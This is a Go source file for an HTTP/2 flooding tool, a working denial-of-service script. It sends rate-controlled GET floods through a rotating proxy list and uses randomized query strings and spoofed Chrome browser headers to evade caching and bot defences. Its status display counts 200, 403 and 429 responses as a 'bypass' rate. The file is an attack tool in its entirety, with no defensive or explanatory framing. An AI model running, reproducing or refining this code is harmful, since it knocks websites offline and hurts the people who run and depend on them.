package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	ciphers = []uint16{
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
	}
	ecdhCurves = []tls.CurveID{
		tls.CurveP256,
		tls.X25519,
	}
)

// Statistics counters
var (
	reqSuccess   uint64
	reqForbidden uint64
	reqLimited   uint64
	reqOther     uint64
	reqFailed    uint64
	inFlight     int64
	totalReqs    uint64
)

func main() {
	if len(os.Args) < 7 {
		fmt.Println("Usage: go run gg.go [host] [time] [rps] [thread] [proxyfile] [method]")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	rate, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]

	parsedTarget, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Error parsing target URL: %v\n", err)
		os.Exit(1)
	}

	proxies, err := readLines(proxyFile)
	if err != nil {
		fmt.Printf("Error reading proxy file: %v\n", err)
		os.Exit(1)
	}

	stopChan := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			runFlooder(parsedTarget, proxies, rate, stopChan)
		}()
	}

	// Live status output loop
	startTime := time.Now()
	ticker := time.NewTicker(1 * time.Second)
	go func() {
		var lastReqs uint64
		for {
			select {
			case <-stopChan:
				ticker.Stop()
				return
			case <-ticker.C:
				elapsed := int(time.Since(startTime).Seconds())
				currentReqs := atomic.LoadUint64(&totalReqs)
				diff := currentReqs - lastReqs
				lastReqs = currentReqs

				avgRPS := int(currentReqs) / elapsed
				if elapsed == 0 {
					avgRPS = 0
				}

				// Target RPS configuration placeholder display
				targetRPS := rate * threads

				// Calculating bypass percentage
				bypassPct := 0.0
				okVal := atomic.LoadUint64(&reqSuccess)
				forbidVal := atomic.LoadUint64(&reqForbidden)
				limitVal := atomic.LoadUint64(&reqLimited)
				othVal := atomic.LoadUint64(&reqOther)
				totalResps := okVal + forbidVal + limitVal + othVal
				if totalResps > 0 {
					bypassPct = (float64(okVal) / float64(totalResps)) * 100.0
				}

				fmt.Print("\033[H\033[J") // Clear terminal screen
				fmt.Printf("========================================================================\n")
				fmt.Printf("  Target      : %s\n", target)
				fmt.Printf("  Proxies     : %d\n", len(proxies))
				fmt.Printf("  Threads     : %d\n", threads)
				fmt.Printf("  RPS Limit   : %d\n", rate)
				fmt.Printf("  Time        : %ds / %ds\n", elapsed, duration)
				fmt.Printf("  Requests    : %d\n", currentReqs)
				fmt.Printf("  Avg RPS     : %d\n", avgRPS)
				fmt.Printf("  Curr RPS    : %d\n", diff)
				fmt.Printf("  Target RPS  : %d\n", targetRPS)
				fmt.Printf("------------------------------------------------------------------------\n")
				fmt.Printf("  200 OK      : %d\n", okVal)
				fmt.Printf("  403 Forbid  : %d\n", forbidVal)
				fmt.Printf("  429 Limit   : %d\n", limitVal)
				fmt.Printf("  Other       : %d\n", othVal)
				fmt.Printf("  Failed      : %d\n", atomic.LoadUint64(&reqFailed))
				fmt.Printf("  InFlight    : %d\n", atomic.LoadInt64(&inFlight))
				fmt.Printf("  Bypass      : %.1f%%\n", bypassPct)
				fmt.Printf("========================================================================\n")
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()
}

func readLines(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func randstr(length int) string {
	const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = characters[rand.Intn(len(characters))]
	}
	return string(result)
}

func generateRandomString(min, max int) string {
	length := rand.Intn(max-min+1) + min
	return randstr(length)
}

func writeFrame(conn net.Conn, streamID uint32, frameType byte, flags byte, payload []byte) error {
	length := len(payload)
	header := make([]byte, 9)
	header[0] = byte(length >> 16)
	header[1] = byte(length >> 8)
	header[2] = byte(length)
	header[3] = frameType
	header[4] = flags
	binary.BigEndian.PutUint32(header[5:9], streamID)
	_, err := conn.Write(header)
	if err != nil {
		return err
	}
	if length > 0 {
		_, err = conn.Write(payload)
	}
	return err
}

func encodeSettings(settings map[uint16]uint32) []byte {
	buf := make([]byte, 6*len(settings))
	i := 0
	for id, val := range settings {
		binary.BigEndian.PutUint16(buf[i:i+2], id)
		binary.BigEndian.PutUint32(buf[i+2:i+6], val)
		i += 6
	}
	return buf
}

func runFlooder(target *url.URL, proxies []string, rate int, stopChan chan struct{}) {
	hpackBuf := &bytes.Buffer{}
	encoder := hpack.NewEncoder(hpackBuf)

	h2SettingsMap := map[uint16]uint32{
		1: 65536,   // SETTINGS_HEADER_TABLE_SIZE
		2: 0,       // SETTINGS_ENABLE_PUSH
		4: 6291456, // SETTINGS_INITIAL_WINDOW_SIZE
		5: 16384,   // SETTINGS_MAX_FRAME_SIZE
		6: 262144,  // SETTINGS_MAX_HEADER_LIST_SIZE
	}
	encodedSettings := encodeSettings(h2SettingsMap)

	updateWindow := make([]byte, 4)
	binary.BigEndian.PutUint32(updateWindow, uint32(rand.Intn(19963105-15663105+1)+15663105))

	for {
		select {
		case <-stopChan:
			return
		default:
			proxyAddr := proxies[rand.Intn(len(proxies))]
			dialer := &net.Dialer{
				Timeout:   10 * time.Second,
				KeepAlive: 30 * time.Second,
			}

			rawConn, err := dialer.Dial("tcp", proxyAddr)
			if err != nil {
				atomic.AddUint64(&reqFailed, 1)
				continue
			}

			// Establish HTTP CONNECT Tunnel
			connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nProxy-Connection: Keep-Alive\r\n\r\n", target.Host, target.Host)
			_, err = rawConn.Write([]byte(connectReq))
			if err != nil {
				atomic.AddUint64(&reqFailed, 1)
				rawConn.Close()
				continue
			}

			respBuf := make([]byte, 1024)
			n, err := rawConn.Read(respBuf)
			if err != nil || !strings.Contains(string(respBuf[:n]), "HTTP/1.1 200") {
				atomic.AddUint64(&reqFailed, 1)
				rawConn.Close()
				continue
			}

			// Establish TLS Session
			tlsConfig := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         target.Hostname(),
				NextProtos:         []string{"h2", "http/1.1"},
				CurvePreferences:   ecdhCurves,
				CipherSuites:       ciphers,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
			}

			tlsConn := tls.Client(rawConn, tlsConfig)
			tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
			err = tlsConn.Handshake()
			if err != nil {
				atomic.AddUint64(&reqFailed, 1)
				tlsConn.Close()
				continue
			}

			// Send HTTP/2 Preface
			_, err = tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
			if err != nil {
				atomic.AddUint64(&reqFailed, 1)
				tlsConn.Close()
				continue
			}

			// Send SETTINGS Frame
			err = writeFrame(tlsConn, 0, 4, 0, encodedSettings)
			if err != nil {
				atomic.AddUint64(&reqFailed, 1)
				tlsConn.Close()
				continue
			}

			// Send WINDOW_UPDATE Frame
			err = writeFrame(tlsConn, 0, 8, 0, updateWindow)
			if err != nil {
				atomic.AddUint64(&reqFailed, 1)
				tlsConn.Close()
				continue
			}

			// Read loop to receive and decode HTTP/2 status codes from server
			go func(c net.Conn) {
				framer := http2.NewFramer(c, c)
				framer.ReadMetaHeaders = hpack.NewDecoder(4096, nil)
				for {
					frame, err := framer.ReadFrame()
					if err != nil {
						return
					}

					switch f := frame.(type) {
					case *http2.MetaHeadersFrame:
						for _, h := range f.Fields {
							if h.Name == ":status" {
								statusVal := h.Value
								if statusVal == "200" {
									atomic.AddUint64(&reqSuccess, 1)
								} else if statusVal == "403" {
									atomic.AddUint64(&reqForbidden, 1)
								} else if statusVal == "429" {
									atomic.AddUint64(&reqLimited, 1)
								} else {
									atomic.AddUint64(&reqOther, 1)
								}
								atomic.AddInt64(&inFlight, -1)
								break
							}
						}
					}
				}
			}(tlsConn)

			// Flood loop for this connection
			streamID := uint32(1)
			ticker := time.NewTicker(100 * time.Millisecond)
			connClosed := false

			for !connClosed {
				select {
				case <-stopChan:
					tlsConn.Close()
					return
				case <-ticker.C:
					// Send 'rate' requests per ticker interval
					for i := 0; i < rate/10; i++ {
						tlsConn.SetWriteDeadline(time.Now().Add(5 * time.Second))
						hpackBuf.Reset()

						// Build target path
						path := target.Path
						if path == "" {
							path = "/"
						}
						path += "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10)

						// Build headers matching Chrome 151
						authority := target.Host
						if rand.Float32() < 0.5 {
							authority = "www." + authority
						}

						headers := []hpack.HeaderField{
							{Name: ":method", Value: "GET"},
							{Name: ":authority", Value: authority},
							{Name: ":scheme", Value: "https"},
							{Name: ":path", Value: path},
							{Name: "sec-ch-ua", Value: `"Not/A)Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"`},
							{Name: "sec-ch-ua-mobile", Value: "?0"},
							{Name: "sec-ch-ua-platform", Value: `"Windows"`},
							{Name: "sec-ch-ua-platform-version", Value: `"15.0.0"`},
							{Name: "sec-ch-ua-arch", Value: `"x86"`},
							{Name: "sec-ch-ua-bitness", Value: `"64"`},
							{Name: "sec-ch-ua-model", Value: `""`},
							{Name: "upgrade-insecure-requests", Value: "1"},
							{Name: "user-agent", Value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"},
							{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
							{Name: "sec-fetch-site", Value: "none"},
							{Name: "sec-fetch-mode", Value: "navigate"},
							{Name: "sec-fetch-user", Value: "?1"},
							{Name: "sec-fetch-dest", Value: "document"},
							{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
							{Name: "accept-language", Value: "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"},
							{Name: "priority", Value: "u=0, i"},
						}

						// Encode
						for _, hf := range headers {
							encoder.WriteField(hf)
						}

						// Write HEADERS Frame
						atomic.AddInt64(&inFlight, 1)
						atomic.AddUint64(&totalReqs, 1)
						err = writeFrame(tlsConn, streamID, 1, 0x1|0x4, hpackBuf.Bytes())
						if err != nil {
							atomic.AddInt64(&inFlight, -1)
							atomic.AddUint64(&reqFailed, 1)
							connClosed = true
							break
						}
						streamID += 2
					}
				}
			}
			tlsConn.Close()
		}
	}
}
